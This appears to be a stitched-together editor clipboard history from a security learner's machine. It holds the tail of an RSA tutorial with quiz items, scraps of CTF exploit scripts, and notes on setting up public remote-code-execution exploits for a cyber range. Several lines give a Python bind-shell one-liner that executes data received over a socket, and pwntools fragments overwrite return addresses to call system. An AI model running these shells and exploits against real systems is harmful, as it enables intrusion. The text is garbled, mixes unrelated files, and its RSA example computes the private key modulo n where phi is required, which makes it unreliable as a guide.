	5. Calculate the modular multiplicative inverse `d` of `e (mod phi(n))`. `d` is the RSA private key. 
	 
	**Note:** Do not try to create RSA keys yourself for public usage. Finding good candidates for the prime factors is not as easy as it seems, and there exist many cryptographic libraries that can be used to create secure RSA keys.
	
	<h3>RSA encryption and decryption</h3>
	To encrypt a message using the RSA public key, we need to encode the message into a number a take that number to the power of `e` `(mod n)`. For extra security, some padding needs to be added to the message before encrypting, but this will not be covered in this scenario. 
	
	To decrypt a message using the private key, we take the ciphertext to the power of `d` `(mod n)`. 
	
	To sum up:
	- `C = M ** e (mod n)`
	- `D = M = C ** d (mod n)`
	where `a ** b` means a to the power b, `M` is the original plaintext, `C` is the ciphertext and `D` is the decrypted plaintext.
	
	If you want to learn more about the mathematics behind RSA, such as modular arithmetic, modular division, modular multiplicative inverses and why this process is followed to create RSA keys, you can check out the links in **Further Reading**, in the **Mission** tab.
	
	<h3>Attacks on RSA</h3>
	What many of the attacks on RSA are trying to achieve is to factor the public modulus N, which is part of the public key, to deduce the prime numbers p and q. If an attacker can successfully factor N, he can use p and q to calculate the totient and find the private key (think about how he could do that).
	Usually, the modulus is extremely large and impossible to be factored. However, if the modulus used is relatively small, a number of techniques can be used to find its prime factor, like looking for the factors in a public database such as http://factordb.com/ .
	There exist many more real-life attacks on the RSA cryptosystem, but are fairly advanced and outside the scope of this scenario.
	
	<h3>Python commands</h3>
	Python can be very useful when we need to quickly perform the mathematical operations required for RSA. Here are some commands and libraries that you can use:
	- Modular exponentiation: to quickly perform the operation `a ** b (mod c)` in python, we can type `pow(a, b, c)`.
	- PyCryptodome library: this library has many cryptographic features, such as transforming a message from bytes to a number and vice versa, calculating the modular inverse of a number and generating prime numbers. Install using `pip install pycryptodome`. 
	Usage example:
	```
	from Crypto.Util.number import bytes_to_long, getPrime, long_to_bytes, inverse // pip install pycryptdome
	
	# Generate p and q and calculate n
	p = getPrime(512)
	q = getPrime(512)
	print("p =", p)
	print("q =", q)
	n = p * q
	print("n =", n)
	
	# Calculate phi and the private key. We will use the value 65537 for the public key
	phi = (p - 1) * (q - 1)
	print("Phi =", phi)
	e = 0x10001
	d = inverse(e, n)
	print("Private key =", d)
	
	# Encode the message into a number
	message = b'this is a secret message'
	encoded_message = bytes_to_long(message)
	print("Encoded message =", encoded_message)
	
	# Calculate the ciphertext 
	ct = pow(encoded_message, e, n)
	print("Ciphertext =", ct)
	
	# Decrypt the ciphertext
	pt = pow(ct, d, n)
	print("Encoded plaintext =", pt)
	
	decoded_plaintext = long_to_bytes(pt)
	print("Decoded plaintext =", decoded_plaintext)
	```
	
	Output: 
	```
	p = 11116188838939060770257745148147358293555735818304945031904314986499619902861389131692960923447811615331917485192156658652749983632634958762152049925477127
	q = 8487919438101303814483748529639602760583915398820568411450788370335198224694701358911154306675934195405262897926286524061449821386207216748726261969771421
	n = 94353315323635617541240165888647973131580886363736711150034510403551383595554194270085212846289841620190673774317987642238558119413513866259612517926688249180917649510307357714930688300002045540200706405560862400711282352622769221148919201338634464926982406154738750208997601178234277584844414025044553787467
	Encoded message = 2854312398284457058259928330243763178290112970307720537957
	Phi = 94353315323635617541240165888647973131580886363736711150034510403551383595554194270085212846289841620190673774317987642238558119413513866259612517926688229576809372469942772973437010513040991400549489280047419045607925517804641665058428597223404341181171668974355631765814886978429258742668903146732658538920
	Private key = 56359754565731777772661683843369428020537970283674886421264338904249904841771213865313118197258166072685724190048770346990445621567676691372279036868884204697245166914580309345730482789172767907553150996322936865868340940926473705876715508727964504695352660715917724594295670850734244655679380372692423879993
	Ciphertext = 55402716640539776765787939267081758049797109446586641906031456198908490643519879691630161631432298803486529306454827065311910870920857603439788882356615634997987462625006116717347353807450667705858828141688203476298594018478551675262034713260793859960587135818308433581159102898830859373015660757370947721421
	Encoded plaintext = 2854312398284457058259928330243763178290112970307720537957
	Decoded plaintext = b'this is a secret message'
	```
	Find more examples and features of the PyCryptodome library here: https://pycryptodome.readthedocs.io/en/latest/src/introduction.html .
	
	<h2>End</h2>
	This is the end of the walkthrough. You can now head to the questions and test your knowledge!  
	
5c6f4f087ee8443725d5a8bdb6b16890|file:///home/neo/cyberranges/work/rsa/rsa101.md|122|1|V|vimwiki
	What is the value of n?
	p = 649070741783334836781039490687
	q = 1070486289218994132971693754401
31aa0b137026e2805fd3452cfe20bc4b|file:///home/neo/cyberranges/work/rsa/rsa101.md|129|1|V|vimwiki
	What is the value of p?
	
	q = 1110095749307584945672171028033
	n = 1208643221080406606293863005883065400169249609315696008151991
2c6af0fd9222a2399ac9af20b306a156|file:///home/neo/cyberranges/work/rsa/rsa101.md|137|1|V|vimwiki
	What is the value of phi(n)?
	
	p = 855035130719865971137792166419
	q = 1109763312415091194747456956377
d016d31dca75027777d59328b2f401c2|file:///home/neo/cyberranges/work/rsa/rsa101.md|145|1|V|vimwiki
	What is the value of the private key `d`?
	
	phi = 668162031825846272314815255387217637798126231020105643461536
	e = 65537
927db7f0e085b918506194d911b2ed43|file:///home/neo/cyberranges/work/rsa/rsa101.md|152|1|V|vimwiki
	Write the number representation of the following text: enc0d3_th1s
	(**Hint:** you can use the `bytes_to_long` function from the PyCryptodome Python library)
	
64288b151c2483e075dbd1488fae83bd|file:///home/neo/cyberranges/work/rsa/rsa101.md|158|1|V|vimwiki
	What is the plaintext? 
	**Hint:** for all the questions in this scenario requiring you to decrypt a ciphertext, you need to transform the decrypted plaintext from an integer back to bytes. Also, you need to provide the answer as a string, not as bytes.
	
	p = 635670668607987161937611322431
	q = 1195909404970947710757136949579
	e = 65537
	Ciphertext = 363206791642753465756967128583357481804690378573020185227804
fd5deebea55ebfe863939c107f649c77|file:///home/neo/cyberranges/work/rsa/rsa101.md|169|1|V|vimwiki
	What is the plaintext?
	
	p = 771064098414219086038491578659
	n = 916169398124173510869300400847142312764599353004968162819683
	e = 65537
	Ciphertext = 391504575204149913871255044465456934511576443147214672076516
5dc9819961b4d4025ecadb73a95eb48a|file:///home/neo/cyberranges/work/rsa/rsa101.md|178|1|V|vimwiki
	What is the value of p?
	(**Hint:** think about the relationship between phi, p and q)
	
	q = 1114313482353782730429633906239
	phi = 795509140647040447053519524402193426375506123650679179934644
c7a92004e4b6fbfb3fcdfa5bb23ec409|file:///home/neo/cyberranges/work/rsa/rsa101.md|187|1|V|vimwiki
	Encrypt the message 'encrypt_this' (without the quotes) given the following:
	
	p = 936391305578598439585838499659
	q = 1144686613930456575556154952209
	e = 65537
1ad3cbe4fbe9aa03ac878163558ad3d7|file:///home/neo/cyberranges/work/rsa/rsa101.md|187|1|V|vimwiki
	Encrypt the message 'encrypt_this' (without the quotes) given the following:
	
	p = 936391305578598439585838499659
	q = 1144686613930456575556154952209
	e = 65537
	
	Give your answer as a number:
64bebdcd93ef7465e12382c276e66486|file:///home/neo/cyberranges/work/rsa/rsa101.md|198|1|V|vimwiki
	What is the plaintext?
	
	n = 848780836124450817787284199737402361939094963246941438729271
	e = 65537
	Ciphertext = 315593482826121462780660588900391342674466247486949323481037
	
15483cc78080367de0398d5eb84df02b|file:///home/neo/cyberranges/work/producer.md|16|1|v|vimwiki
	web_1  | # There 
1c3aa72754494130d64552767f6c136f|file:///home/neo/cyberranges/work/producer.md|2|1|V|vimwiki
	No Wing server set up in docker image?
40dc5cac5f6183618911881085d91c91|file:///home/neo/cyberranges/work/producer.md|21|1|V|vimwiki
	Cant get it working with metasploit
207afe09c5c41e6bdd805ecc05b5c413|file:///home/neo/cyberranges/work/producer.md|14|1|V|vimwiki
	Cant connect with Metasploit module
37567a8f11cdf85a1528cfe5b231e88c|file:///home/neo/cyberranges/work/producer.md|26|1|V|vimwiki
	There is insufficient memory for the Java Runtime Environment to continue.
99f1d479e20b1d0dc9c869ff32a057a0|file:///home/neo/CTFs/hacktivitycon2020/bizzaro/decoded-messages.txt|1|1|V|text
	13775b70cc2f163e5978ad46068d1f32
c399290059e3aec6515b28e0a58bba62|file:///home/neo/CTFs/hacktivitycon2020/bizzaro/solve.sh|4|5|V|sh
	    cd ..
5bd87f1e40c9e1851419cf82965b4aeb|file:///home/neo/.bashrc|5|1|V|sh
	eval $(thefuck --alias)
0217a175a4af58bacce5845365d40a54|file:///home/neo/CTFs/hacktivitycon2020/bizzaro/solve.sh|2|5|V|sh
	    bash 
13053e09c87e043bb93ba1b65055067c|file:///home/neo/CTFs/hacktivitycon2020/bizzaro/solve.sh|6|5|V|sh
	    exit
d422c32fb9172a9964c3d40cb4bdcf70|file:///home/neo/CTFs/hacktivitycon2020/bizzaro/solve.sh|5|1|V|sh
	    echo "test" >> ../files.txt
c8fbfdd90d13b28dd365c1c51789755a|file:///home/neo/CTFs/hacktivitycon2020/bizzaro/solve.sh|7|1|V|sh
	killall bash
fc0b2a7c4b8d6ed0f69e2ddeb859b105|file:///home/neo/CTFs/hacktivitycon2020/bizzaro/solve.sh|12|1|V|sh
	while read p; do
	  echo "$p"
	done
6543f02a6c7e4961c4085b4c27647ddd|file:///home/neo/CTFs/hacktivitycon2020/bizzaro/solve.sh|8|5|v|sh
	peptides
8f31d0c4dede295695440cd47bee5581|file:///home/neo/CTFs/hacktivitycon2020/bizzaro/solve.sh|10|4|V|sh
	   # do something with $line here
45b963397aa40d4a0063e0d85e4fe7a1|file:///home/neo/CTFs/hacktivitycon2020/bizzaro/solve.sh|8|5|v|sh
	files
897c279e517780e89a28d304b4a12bd6|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|10|22|v|python
	svc.pwnable.
6a486938812419f017719949b7bab409|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|49|13|V|python
	io.sendlineafter(': ', b'a'*15)
	# Play game and give wrong answer to put -1 (0xffff) at cur + 0x10
	io.sendlineafter('> ', '1')
	io.sendlineafter('= ', '0')
	
	# Code casts short to int, score will extend 
	# from 0xffff to 0xffffffff
	io.sendlineafter('> ', '2')
	
	# Call edit name to overwrite address of play_game
	# Send only the 3 address bytes cause buffer is 27 bytes big
	io.sendlineafter('> ', '3')
	io.send(b'a'*24 + p64(WIN_ADDR)[:3])
	
	# Call play_game again to call win
	io.sendlineafter('> ', '1')
03269eff670418273b53e88ff17038b1|file:///home/neo/ccsc/skeleton.py|32|1|V|python
	OFFSET = cyclic_find(0xdeadbeef)  # cyclic(1024)
	payload = 'A' * offset
ef60f001cd95741f4bad4348631dcd4f|file:///home/neo/CTFs/hacktivitycon2020/ofbuscated/ofbuscated.py|3|1|v|python
	from Crypto.Cipher import AES
	from Crypto.Util.Padding import pad
	import random
	import os
	import socketserver
	import string
	import threading
	from time import *
	import random
	import time
	import binascii
	
	
e96664bd46ecea7a6fe145e8ca217bd5|file:///home/neo/CTFs/hacktivitycon2020/ofbuscated/ofbuscated.py|39|1|V|python
	    def shuffle(self, pt):
7616003501b8a617908713c2ed665a9c|file:///home/neo/CTFs/hacktivitycon2020/ofbuscated/ofbuscated.py|40|1|V|python
	        pt = pad(pt, 16)
	        pt = [pt[i: i + 16] for i in range(0, len(pt), 16)]
	        random.shuffle(pt)
	        return pt
ce859de0a29a8d5255480ac26519cfa7|file:///home/neo/CTFs/hacktivitycon2020/ofbuscated/ofbuscated.py|27|1|V|python
	    def byte_xor(self, ba1, ba2):
	        return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])
31cad9236f1415796a2f5818c7df8270|file:///home/neo/CTFs/hacktivitycon2020/zipper.py|9|1|V|python
	# opening the zip file in READ mode 
3090ad88ff7c9ca191579b709069fe64|file:///home/neo/CTFs/hacktivitycon2020/zipper.py|9|14|v|python
	file_name
ea191261d3a6afd0994320c4b59eebbe|file:///home/neo/CTFs/hacktivitycon2020/zipper.py|10|25|V|python
	    # printing all the contents of the zip file 
	    zip.printdir() 
894dda8cbcdbff8d0e8c8f01c5e3e7af|file:///home/neo/CTFs/hacktivitycon2020/zipper.py|10|5|V|python
	    # extracting all the files 
d37af6f5d8cc22164165f3068537fa12|file:///home/neo/CTFs/hacktivitycon2020/zipper.py|10|5|V|python
	    print('Extracting all the files now...') 
98f6b8e3dbcf55a94e4782d3b5b88a9c|file:///home/neo/CTFs/hacktivitycon2020/zipper.py|10|3|V|python
	    zip.extractall() 
9b004f8e8c0987b7f33d1cd9ea874bf9|file:///home/neo/CTFs/hacktivitycon2020/zipper.py|10|5|V|python
	    print('Done!')
966ecd668d9c7d8bd330d963381901ca|file:///home/neo/CTFs/hacktivitycon2020/zipper.py|9|1|V|python
	with ZipFile('./files.zip', 'r') as zip: 
	    print(zip.infolist())
ff6fb43522ced0b79f719613cbdce1bf|file:///home/neo/cyberranges/work/producer.md|31|1|V|vimwiki
	TODO: add swap and re build
204ec9db291d2df88f03e3f189f1eebe|file:///home/neo/cyberranges/work/producer.md|21|1|V|vimwiki
	### 48338 - Apache Solr - Remote Code Execution via Velocity Template (Metasploit)
	Works
	exploit: https://github.com/jas502n/solr_rce
	
2c6623781b6b54174297fa10a8768144|file:///home/neo/cyberranges/work/producer.md|33|9|V|vimwiki
	### 48182 - PHP-FPM - Underflow Remote Code Execution (Metasploit)
	Works
	exploit: https://github.com/neex/phuip-fpizdam
d9e5f54913497a8ddaa393af5ce43558|file:///home/neo/cyberranges/work/producer.md|11|1|V|vimwiki
	### 48676 - Wing FTP Server 6.3.8 - Remote Code Execution (Authenticated)	
	Nothing set up
	
	### 48670 - Joomla! J2 JOBS 1.3.0 - 'sortby' Authenticated SQL Injection	
	Nothing set up
	
	### 48656 - Wordpress Plugin Powie's WHOIS Domain Check 0.9.31 - Persistent Cross-Site Scripting	
	Nothing set up
f3e9369faf170357a03aaa85336d6a54|file:///home/neo/cyberranges/work/producer.md|18|1|V|vimwiki
	### 48343 - Nexus Repository Manager - Java EL Injection RCE (Metasploit)
	There is insufficient memory for the Java Runtime Environment to continue.
84638ceaba9e0755a203848e5a7b433b|file:///home/neo/cyberranges/work/producer.md|11|1|V|vimwiki
	### 48421 - Saltstack 3000.1 - Remote Code Execution	
	Cant access salt master?
	
	### 48410 - Apache Shiro 1.2.4 - Cookie RememberME Deserial RCE (Metasploit)	
	Can't get it working with metasploit
	
64888328c683337fdf2963f58da09649|file:///home/neo/cyberranges/work/producer.md|29|1|V|vimwiki
	=====================================================================================
	Not set up
	=====================================================================================
756fc427f8f62504f8e37b4c56962451|file:///home/neo/cyberranges/work/producer.md|11|1|V|vimwiki
	=====================================================================================
	Not working
	=====================================================================================
d84b483e6ebae7819e5899bfc926bfc5|file:///home/neo/cyberranges/work/producer.md|16|15|v|vimwiki
	maybe need to set up a webpage with uploads to get RCE
e4781bfff256b0dd079d5adb8423cd8b|file:///home/neo/cyberranges/work/producer.md|26|1|V|vimwiki
	exploit: https://github.com/mzer0one/CVE-2020-7961-POC
c4fbc1ccefbe7f15d7d22f65f3e094a4|file:///home/neo/cyberranges/work/producer.md|39|1|V|vimwiki
	Can't get it working with metasploit
7ed72bb3e6c6b95cdd735fa34c64a461|file:///home/neo/cyberranges/work/producer.md|24|1|V|vimwiki
	### 46773 - Domoticz 4.10577 - Unauthenticated Remote Command Execution
f83630579d055dc5843ae693e7cdafe0|untitled:1|1|53|v|
	2425
357e2f201003ee414f285d2295cbb0cd|untitled:1|1|1|V|
	""" python -c "import socket as a; s = a.socket(); s.bind(('127.1',4444)); s.listen(1); (r,z) = s.accept(); exec(r.recv(999))" """
a71d6c4f2ec94d3ad98305e68cfde481|untitled:1|1|1|V|
	""" python -c "import socket as a; s = a.socket(); s.bind(('127.1',4444)); s.listen(1); (r,z) = s.accept(); exec(r.recv(999))"
edcef2d65de33b8b4c6fc8760218e428|untitled:1|1|1|V|
	python -c "import socket as a; s = a.socket(); s.bind(('127.1',4444)); s.listen(1); (r,z) = s.accept(); exec(r.recv(999))"
6789e76a8cb457deb1637b0e4db6a16a|untitled:1|1|57|v|
	127.1
dc75dae7b308128447f9ac7ac00557f5|untitled:1|1|1|V|
	python -c "import socket as a; s = a.socket(); s.bind(('0.0.0.0',4444)); s.listen(1); (r,z) = s.accept(); exec(r.recv(999))"
b7a365396fcc1ae2fb5e67541793f5fe|file:///home/neo/cyberranges/work/producer.md|22|2|V|vimwiki
	https://www.exploit-db.com/exploits/46773
	Cant get bind shell with python
82539e24c07c86d0d5fad612085e8103|file:///home/neo/cyberranges/work/producer.md|23|1|V|vimwiki
	Cant get bind shell with python
5c9c6fdef0e2bc918a8beda9435d62c9|file:///home/neo/cyberranges/work/producer.md|44|1|V|vimwiki
	Cant access salt master?
d8e8b222aeba525695a0173b837533af|file:///home/neo/cyberranges/work/producer.md|43|1|V|vimwiki
	### 48421 - Saltstack 3000.1 - Remote Code Execution	
66e62e2ac0e5e3dc9ce1020f73929da0|file:///home/neo/cyberranges/work/producer.md|23|1|V|vimwiki
	Cant get python bind shell working through rce
f40861793777d037efcc83421d590b20|file:///home/neo/CTFs/hacktivitycon2020/pasta.py|2|18|v|python
	source_secret.png
747ec261be9a766391f7e768c8aad7f7|file:///home/neo/CTFs/hacktivitycon2020/pasta.py|2|1|V|python
	import binascii
09fec6b036b91aba991b13b12f0dce28|file:///home/neo/CTFs/hacktivitycon2020/theory.txt|2|1|V|text
	2. have backfired, causing an ice age. The only surviving humans inhabit a socially segregated
ed474718ad2e0c0f4c74bf34f954ed28|file:///home/neo/CTFs/hacktivitycon2020/theory.txt|54|1|V|text
	54. movie, while considered more family-friendly, doesn't even show us whether the other kids survived.
d07be8a6c9e6d4425cc1981e2b7d20f0|untitled:1|7|3|v|
	]/C:\Users\flag\Desktop\flag.txt
99ff0f07c4d43fa715ccfcdee5a5b3ab|untitled:1|27|2|v|
	Hj]/C:\Users\flag\Desktop\flag.txt
58edf87c99dace9838965aefaad12f8d|untitled:1|27|2|v|
	$#]/C:\Users\flag\Desktop\flag.txt
28f145c9f933e681a95b189e4043113d|untitled:1|27|2|v|
	&]/C:\Users\flag\Desktop\flag.txt
9580a5b07ca556df872f85676bb3053c|untitled:1|27|2|v|
	)`]/C:\Users\flag\Desktop\flag.txt
815bcc18b651bffba0de93d44440f991|untitled:1|27|2|v|
	 ]/C:\Users\flag\Desktop\flag.txt
d9d14bdfe355cadfadf848b22206e92b|untitled:1|27|2|v|
	d&]/C:\Users\flag\Desktop\flag.txt
9cb1e6699a9ec34f666495dbdaa43809|untitled:1|27|2|v|
	7%]/C:\Users\flag\Desktop\flag.txt
a1e5f2545297ded1a3c82c3161754d3a|untitled:1|27|2|v|
	}+]/C:\Users\flag\Desktop\flag.txt
d86ff0f8a18cab3a997b6a6f791a6701|untitled:1|27|2|v|
	$]/C:\Users\flag\Desktop\flag.txt
9c24f96ec1759762d73bae063fcd6b45|untitled:1|27|2|v|
	!]/C:\Users\flag\Desktop\flag.txt
4f28da10d2524516fc0ec5288aacc1fd|untitled:1|27|2|v|
	4]/C:\Users\flag\Desktop\flag.txt
9d55d7b244f38f305951d838c948bb6e|untitled:1|27|2|v|
	[!]/C:\Users\flag\Desktop\flag.txt
82d260e4214cc4aedc8f7b902d28f8d0|untitled:1|29|2|v|
	9]/C:\Users\flag\Desktop\flag.txt
5f1783536794bed6d1fde3c217a630ec|untitled:1|44|2|v|
	)]/C:\Users\flag\Desktop\flag.txt
89eaa029c22464b5118b57701ee240a1|untitled:1|44|2|v|
	e]/C:\Users\flag\Desktop\flag.txt
b8eb5a3662208aed5cdacc566d390930|untitled:1|44|2|v|
	'(]/C:\Users\flag\Desktop\flag.txt
92e9528046671d2cc5f94968d9f3c399|untitled:1|44|2|v|
	8e]/C:\Users\flag\Desktop\flag.txt
8d22c43b724791bb813918603e70008d|untitled:1|44|2|v|
	s#]/C:\Users\flag\Desktop\flag.txt
3a8ce606c6809aefaff00257014c38d9|untitled:1|44|2|v|
	K*]/C:\Users\flag\Desktop\flag.txt
9cd5665a027b93b6047faf36ab013a44|untitled:1|44|2|v|
	V]/C:\Users\flag\Desktop\flag.txt
71a231f21682f66b2ffd85161664317d|untitled:1|44|2|v|
	F"]/C:\Users\flag\Desktop\flag.txt
df06439e1085a3bca035505ea076a125|untitled:1|44|2|v|
	.]/C:\Users\flag\Desktop\flag.txt
bc7e7784a8dced15a116157afeb01748|untitled:1|44|2|v|
	*]/C:\Users\flag\Desktop\flag.txt
7a7880ed0ec4150585ccf74f977f0392|untitled:1|1|1|V|
	o_s_afhlta_ogafnacg_ns
	
	flag{
	dumpster_
	}
fe6549a825580389c711d0b2f60f4474|untitled:1|2|1|V|
	o_s_afhlta_ogafnacg_ns
326b44ef4eeba3c4996fb314c6b69626|untitled:1|2|16|v|
	nacg_ns
4f7f91e0d863cfed249116dffc07d803|untitled:1|2|1|V|
	ofgafnagns
2e49d5b7bf3900ee747d9263d35c66ca|untitled:1|5|1|V|
	calathos
75e4196311f8d4a4b622b7dd52824ab7|untitled:1|1|1|V|
	
	ofgafnagns
	calathos
	____
	
	
	flag{
	dumpster_
	}
76e9281d1181ce8d9f9c8c632dc193b9|untitled:1|1|2|v|
	: 0075EFBFBD195D08 2F001E00 00004300
07de7514ffb57647118ef5c31082d3f1|untitled:1|21|2|v|
	: EFBFBD54EFBFBD29 5D082F00 1E000000
29ffe87c0376c068c6fb934ebabc1389|untitled:1|21|2|v|
	: 00EFBFBDEFBFBD27 5D082F00 1E000000
34eec5f8352a14946a80ce6b06a6a77f|untitled:1|21|2|v|
	: EFBFBDEFBFBD5027 5D082F00 1E000000
cf72a347f3d9f74f25682fa03458f231|untitled:1|21|2|v|
	: EFBFBDEFBFBD2920 5D082F00 1E000000
13fb348f86232d12ca3949a8a6c84b31|untitled:1|21|2|v|
	: EFBFBDEFBFBDEFBF BD1E5D08 2F001E00
e942258f187c2587849c0894f1e7babc|untitled:1|21|2|v|
	: 00EFBFBDEFBFBD1B 5D082F00 1E000000
344dbddbcaf46d3b8c9c34c5f5d9b6f4|untitled:1|21|2|v|
	: 00EFBFBD24235D08 2F001E00 00004300
baa457999f4becf23165e51bfcea840f|untitled:1|21|2|v|
	: 00486A185D082F00 1E000000 43003A00
6cb5b6e499373a8f074a963c93ceb912|untitled:1|21|2|v|
	: 00EFBFBD07165D08 2F001E00 00004300
1bf0c89f9a7735e9257edec2580a46e7|untitled:1|21|2|v|
	: EFBFBDEFBFBD1F26 5D082F00 1E000000
22874d4fa560c07f4f79539f664cbf85|untitled:1|21|2|v|
	: 0064EFBFBD265D08 2F001E00 00004300
2678fc7c3e7880a43a061c25c78589bc|untitled:1|21|2|v|
	: 0029601E5D082F00 1E000000 43003A00
eebddfd5175aad91cc3d6df1a415db22|untitled:1|21|2|v|
	: 0037EFBFBD255D08 2F001E00 00004300
459d9806c492b536f163f17ba2db9322|untitled:1|21|2|v|
	: 00EFBFBDEFBFBD20 5D082F00 1E000000
05a9bcd01bacfb7f065df4f1dba6320e|untitled:1|21|2|v|
	: 00187D2B5D082F00 1E000000 43003A00
d0fcc31d6fa912a648d82fa5fd160b02|untitled:1|21|2|v|
	: EFBFBDEFBFBDEFBF BD245D08 2F001E00
5352e420881f12595f031338d0a528bb|untitled:1|21|2|v|
	: 00EFBFBDEFBFBD21 5D082F00 1E000000
ec84b939c3c4779b8310a39332051e4f|untitled:1|21|2|v|
	: EFBFBD0B341A5D08 2F001E00 00004300
1da98239cc93e1328df588a533c53586|untitled:1|21|2|v|
	: EFBFBDEFBFBDEFBF BD175D08 2F001E00
ee711af97d81540b50fa6080b74a35d9|untitled:1|21|2|v|
	: EFBFBD195B215D08 2F001E00 00004300
1f081d233014ca23a33695f52688bcab|untitled:1|37|2|v|
	: EFBFBDEFBFBDEFBF BD1D5D08 2F001E00
69f12e6829decd7fb3fb0e4000addf0c|untitled:1|37|2|v|
	: 00EFBFBDEFBFBD1A 5D082F00 1E000000
6d669c343e1e6a984f444eb33ae3d2b3|untitled:1|37|2|v|
	: 001B39175D082F00 1E000000 43003A00
36e7b306a6939ba5f986368435194f7c|untitled:1|37|2|v|
	: 00EFBFBD1A295D08 2F001E00 00004300
440dbad6a6f895a1aa5bec7ac53a580c|untitled:1|37|2|v|
	: EFBFBD27EFBFBD28 5D082F00 1E000000
5cfdebbf769daf821401ca280370e2b5|untitled:1|37|2|v|
	: EFBFBD38651B5D08 2F001E00 00004300
91e542b687dc2dba6f22b31348dcfa23|untitled:1|37|2|v|
	: 00EFBFBD4B2A5D08 2F001E00 00004300
8542a110aff56621674fdecd999db039|untitled:1|37|2|v|
	: EFBFBD65EFBFBD1C 5D082F00 1E000000
f0dd6a69911b1197f56e3c429a6bde3b|untitled:1|37|2|v|
	: 0056245D082F001E 00000043 003A005C 
1b2b8bb94197cf3ffaee98fddcee573a|untitled:1|37|2|v|
	: EFBFBD73EFBFBD23 5D082F00 1E000000
796e4fafc4e661955f1aa47129a8dc40|untitled:1|37|2|v|
	: 0056EFBFBD1F5D08 2F001E00 00004300
ff599726108856f1514703b8eeafcb9c|untitled:1|37|2|v|
	: EFBFBDEFB
0a320fef17ca303bb9711a562d61bb87|untitled:1|37|2|v|
	: EFBFBD46EFBFBD22 5D082F00 1E000000
6f7a6253d7c77e814a48ba27ed8e301e|untitled:1|37|2|v|
	: EFBFBDEFBFBDEFBF BD165D08 2F001E00
743a489643a39390326361889cf64b62|untitled:1|37|2|v|
	: EFBFBDEFBFBD0219 5D082F00 1E000000
d33c2efaf3ea099e290aa1ac553fce29|untitled:1|37|2|v|
	: 00EFBFBD2E1D5D08 2F001E00 00004300
fdfacbc6cbd534e54d07b9c856a6fa1a|file:///home/neo/CTFs/hacktivitycon2020/dumpster.txt|1|1|V|text
	oafhaatnacgns
0cb9799749aacccceb708b37ce65b8c0|file:///home/neo/CTFs/hacktivitycon2020/dumpster.txt|1|1|V|text
	afhatacs
65de8186e4408bd677d892d7cbc3198c|file:///home/neo/CTFs/hacktivitycon2020/dumpster.txt|1|1|V|text
	aftac
d2f287e88f0be0d3f1c48a7686fd7b65|file:///home/neo/CTFs/hacktivitycon2020/dumpster.txt|1|1|V|text
	aftachasgonna
2165e4fa5bddb65a31f6a0c495c2fa37|file:///home/neo/CTFs/hacktivitycon2020/dumpster.txt|2|1|V|text
	logs
3f3e20a1a7a32f7b7cb4e8b2dcacdf00|file:///home/neo/CTFs/hacktivitycon2020/dumpster.txt|1|1|V|text
	aftachasgonnalogs
a31bd1525a280840b63f38d579811abf|file:///home/neo/CTFs/hacktivitycon2020/dumpster.txt|1|1|V|text
	aftachas
e2625adf324b4d97f5d487a64eb31ed7|file:///home/neo/CTFs/hacktivitycon2020/dumpster.txt|1|1|V|text
	aftachaslogs
3bfea1f31bb5a1e40786ff7eef41bf81|file:///home/neo/CTFs/hacktivitycon2020/dumpster.txt|3|1|V|text
	gonna
d77be0c283c8e48d27a1be17f231dcb3|file:///home/neo/CTFs/hacktivitycon2020/dumpster.txt|1|1|V|text
	fhassgonna
12b623a2ece1dcc6b91682baee5cd667|file:///home/neo/CTFs/hacktivitycon2020/dumpster.txt|1|1|V|text
	fhasgonna
cd2452027356b7cbbfe889553860488f|file:///home/neo/CTFs/hacktivitycon2020/dumpster.txt|1|1|V|text
	fhasgonnacatalogs
b09cb54b10cef69a8901d73eff477a5a|file:///home/neo/CTFs/hacktivitycon2020/dumpster.txt|5|1|V|text
	dumpster
30639096bfe4ec4b9f17696ef1d02b9f|file:///home/neo/CTFs/hacktivitycon2020/dumpster.txt|2|1|V|text
	trash
f1d848624c5f4c20d00bbd31544e23d8|file:///home/neo/CTFs/hacktivitycon2020/dumpster.txt|1|1|V|text
	fgcalogdupst
5128f35c9b4be13788ba41bdb6d1fc1f|file:///home/neo/CTFs/hacktivitycon2020/dumpster.txt|4|1|V|text
	uploads
fa32397c6f93059a39574bc680836de0|file:///home/neo/CTFs/hacktivitycon2020/dumpster.txt|1|1|V|text
	fgcgtuploads
282ad5bcdf1e331edb80181264f11185|file:///home/neo/CTFs/hacktivitycon2020/dumpster.txt|1|1|V|text
	fgctupad
d4fc3e30b337ca666853482743f705a0|file:///home/neo/CTFs/hacktivitycon2020/dumpster.txt|4|1|V|text
	mans
4c119e64c218ad451613985649196dd9|untitled:1|8|1|V|
	THE STACK NEWSLETTER
	Sign up to The Stack to receive Book Riot Comic's best posts, picked for you.
	Email
	By signing up you agree to our terms of use
088134e3f61d40645834ff38000d5c8e|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|48|1|V|python
	io.sendline(cyclic(1024))
	io.sendline(cyclic(1024))
	io.sendline(cyclic(1024))
9e64fdeab436352f7699866d20098bfc|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|52|1|V|python
	io.recvuntil('domain:\n')
ad5f82e879a9c5d6b5b442eb37e50551|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|54|15|v|python
	domain
7fec157658741625cfbb9cda7a021a33|file:///home/neo/ccsc/pie/exploit.py|78|3|v|python
	bc = ELF("./libc-2.30.so")
6598d903980cfe6f06f07fccb453a642|file:///home/neo/ccsc/pie/exploit.py|78|1|V|python
	libc = ELF("./libc-2.30.so")
	
	SYSTEM_OFFSET = libc.sym.system
1d347918b4c8efca8f96c5d037e893bd|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|49|15|v|python
	exe.sym.main
43f036e81d6038839e293bd32dd01bc5|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|49|1|V|python
	SYSTEM_ADDR = libc.sym.system
2a888e1e44115251d99fbc385bc6e552|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|50|15|v|python
	libc.sym.system
3b845d87440a5bc2a33494806b788df5|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|57|1|V|python
	io.sendline(p32(BINSH_ADDR) + b'a' * 60)
fd877d8c6205fc578b877c001fbfc1b0|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|62|1|V|python
	io.sendline(b'c'*34 + p32(SYSTEM_ADDR) + b'c')
